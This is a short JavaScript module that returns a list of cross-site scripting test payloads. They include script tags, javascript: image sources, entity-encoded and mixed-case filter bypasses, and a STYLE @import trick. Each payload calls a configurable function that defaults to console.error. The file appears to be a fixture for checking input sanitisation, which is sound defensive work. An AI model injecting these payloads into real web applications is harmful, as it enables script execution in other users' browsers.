module.exports = function(fn) {
    fn = fn || 'console.error';

    return [
        '>"><script>' + fn + '("XSStest1")</script>&',
        '"><STYLE>@import"javascript:' + fn + '(\'XSStest2\')";</STYLE>',
        '>"\'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;',
        ' alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>',
        '>%22%27><img%20src%3d%22javascript:' + fn + '(%27%20XSStest3%27)%22>',
        `'%uff1cscript%uff1e' + fn + '('XSStest4')%uff1c/script%uff1e'
        ">
        >" `,
        '\'\';!--"<XSS>=&{()}',
        '<IMG SRC="javascript:' + fn + '(\'XSStest5\');">',
        '<IMG SRC=javascript:' + fn + '(\'XSStest6\')>',
        '<IMG SRC=JaVaScRiPt:' + fn + '(\'XSStest7\')> ',
        '<IMG SRC=JaVaScRiPt:' + fn + '(&quot;XSStest8<WBR>&quot;)>',
        `<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;
         &#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>`,
        `<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058
         &<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>`,
        `<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28
         &<WBR>#x27&#x58&#x53&#x53&#x27&#x29>`,
        '<IMG SRC="jav&#x09;ascript:' + fn + '(<WBR>\'XSStest9\');">',
        '<IMG SRC="jav&#x0A;ascript:' + fn + '(<WBR>\'XSStest10\');">',
        '<IMG SRC="jav&#x0D;ascript:' + fn + '(<WBR>\'XSStest11\');">',
        'js4%22,x:' + fn + '%28%22XSS12%22%29,y:%22'
    ];
};
